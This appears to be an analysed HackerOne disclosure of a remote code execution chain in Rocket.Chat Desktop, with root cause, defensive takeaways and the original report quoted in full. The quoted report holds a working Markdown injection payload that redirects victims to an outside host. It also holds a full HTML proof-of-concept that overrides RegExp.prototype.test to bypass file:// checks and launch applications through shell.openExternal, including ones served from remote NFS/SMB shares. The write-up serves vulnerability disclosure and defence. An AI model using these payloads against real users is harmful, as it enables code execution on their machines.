# Remote Code Execution in Rocket.Chat Desktop via Markdown Parser XSS and Electron Shell Bypass

## Metadata
- **Source:** HackerOne
- **Report:** 276031 | https://hackerone.com/reports/276031
- **Submitted:** 2017-10-10
- **Reporter:** mattaustin
- **Program:** Rocket.Chat
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Cross-Site Scripting (XSS), HTML Injection, Remote Code Execution, Improper Input Validation, Electron Security Misconfiguration
- **CVEs:** None
- **Category:** memory-binary

## Summary
The Rocket.Chat Desktop application's Markdown parser can be manipulated using a combination of link syntax and inline code blocks to break out of HTML attributes and inject arbitrary JavaScript. By leveraging prototype pollution of RegExp.prototype.test in the isolated preload context, an attacker can bypass file:// URL validation and execute arbitrary applications via shell.openExternal().

## Attack scenario
1. Attacker crafts a malicious Markdown message combining link and code block syntax: `[ hax ](http://hax//onmouseover=location='https://attacker.com/payload.html';"hax`zzz)`
2. When rendered, the parser breaks out of the href attribute and injects onmouseover event handler with attacker-controlled redirect
3. Victim moves mouse over link, triggering redirect to attacker-controlled HTML page
4. Attacker's webpage overrides RegExp.prototype.test method using Proxy to intercept and manipulate the file:// validation regex
5. Webpage creates and clicks a link with file:///path/to/application (e.g., Calculator.app or malicious NFS/SMB executable)
6. Overridden RegExp.test returns false for attacker's payload, bypassing validation and executing shell.openExternal() with attacker-controlled application path

## Root cause
Multiple security flaws: (1) Markdown parser insufficient HTML escaping allows attribute breakout via combined syntax, (2) Preload script directly attached to user-controlled DOM as window.onload handler instead of isolated event listener, (3) Prototype pollution allowed in preload context enabling bypass of RegExp-based validation, (4) Insufficient file:// URL validation in shell.openExternal() invocation

## Attacker mindset
Sophisticated multi-stage attack leveraging layered vulnerabilities. Attacker recognizes markdown parsing weakness, understands Electron security model limitations, exploits prototype pollution for validation bypass, and weaponizes shell.openExternal() to execute arbitrary code. Knowledge of LaunchServices and cross-platform application execution paths (Windows NFS/SMB shares) shows advanced understanding of target environment.

## Defensive takeaways
- Implement strict HTML sanitization in Markdown parser using allowlists rather than blacklists; use established libraries like DOMPurify
- Move security-critical validation code to proper isolated scope using window.addEventListener('load', ...) instead of inline window.onload
- Prevent prototype pollution by freezing critical built-in prototypes (Object.freeze(RegExp.prototype)) or using defensive copies
- Validate file:// URLs against a strict allowlist before passing to shell.openExternal()
- Consider disabling shell.openExternal() entirely and implementing safer internal navigation/link handling
- Implement Content Security Policy (CSP) to restrict inline script execution and external resource loading
- Regular security audits of Electron preload scripts and renderer process trust boundaries
- Use contextIsolation and preload scripts properly to maintain secure context separation

## Variant hunting
Test other Markdown syntax combinations (bold, italic, tables, blockquotes) for attribute breakout potential
Investigate whether other built-in prototypes (Array.prototype, Object.prototype) can be exploited for validation bypass
Check if other Electron APIs beyond shell.openExternal() are exposed and vulnerable to similar manipulation
Test whether CSP or sandbox restrictions can be bypassed through prototype pollution or DOM manipulation
Examine whether the vulnerability exists in renderer process beyond preload context
Investigate stored XSS potential if messages are persisted and later rendered in different contexts

## MITRE ATT&CK
- T1190
- T1203
- T1059
- T1566
- T1566.002
- T1204.001
- T1648

## Notes
This is a sophisticated multi-stage RCE requiring user interaction (mouse hover). The vulnerability chain demonstrates how combining multiple moderate issues (XSS, inadequate isolation, prototype pollution) creates critical impact. Desktop application context makes RCE particularly severe as it enables local code execution with user's privileges. The use of NFS/SMB shares on Windows is particularly noteworthy as it allows remote executable execution without local file presence. Report demonstrates excellent security research methodology with clear PoC, attack walkthrough, and mitigation suggestions.

## Full report
<details><summary>Expand</summary>

**Summary:** The Markdown parser can be tricked into allowing arbitrary Javascript leading to "remote code execution". 

**Description:** 
By combining the "link" and inline code block we can trick the parser into breaking out of the current HTML attribute. 

This allows us to control other attributes of the tag and trigger javascript events. 
```
[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';"`hax`zzz)
```
becomes 
```html
<a href="&lt;a href=" http:="" hax="" onmouseover="location='https://maustin.net/hax/rocket/hack.html';&quot;&quot;" target="_blank" rel="noopener noreferrer">
```

This is a simple redirect to: https://maustin.net/hax/rocket/hack.html

From this point the goal is to get the application to call shell.openExternal(href); with a URL we control. Thats because: 
>      "open 'file://localhost/Volumes/Macintosh HD/foo.txt'" opens the document
     in the default application for its type (as determined by LaunchSer-
     vices).

Note:  For this demo I point to file:///Applications/Calculator.app however if you point to a public NFS or SMB server on windows this executable can be controlled by the attacker. (example at: file:///net/192.241.239.91/var/nfs/general/hack2.app)

In https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js#L45 all links are hooked and some patter matching is used to check before firing them off to shell.openExternal(href); 

Normally preload javascript is an "isolated scope" in this case however the code is directly attached to the user controlled DOM as the "window.onload" handler. This means we can overload some global objects and methods including the RegExp.prototype.test method. Now we can bypass the file:\\/\\/ check send our application path to openExternal.

```html
<!DOCTYPE html>
<html>
    <head>
      <script>
        RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
          apply: function(target, thisArg, argumentsList) {
            console.log(thisArg.source);
          console.log(argumentsList[0]);
          if((thisArg.source == '^file:\\/\\/.+') && (argumentsList[0] === 'file:///Applications/Calculator.app')){
            return false;
          }
          return Reflect.apply(target, thisArg, argumentsList)
          }
        });
        setTimeout(()=>{
            a = document.createElement("A")
            a.href="file:///Applications/Calculator.app"
            document.body.appendChild(a)
            a.click()
        }, 3000);
      </script>
    </head>
    <body>
     <h1>3...2...1...🚀</h1>
    </body>
</html>
```

## Releases Affected:

  * >= 2.9.0

## Steps To Reproduce (from initial installation to vulnerability):

  1. Create a new channel to test in. 
  1. Send the following snippet of markdown: 
```
[ hax ](http://hax//onmouseover=location='https://maustin.net/hax/rocket/hack.html';"`hax`zzz)
```
  1. Move your mouse over the link you just send and 

## Supporting Material/References:

  * https://youtu.be/HPlwlc2J-LQ

## Suggested mitigation

  * The markdown parser needs a little love to prevent the initial xss. 
  * I believe you should be able to use something like  `window.addEventListener("load",` .. to execute the checks in the proper scope. 


</details>

---
*Analysed by Claude on 2026-05-12*
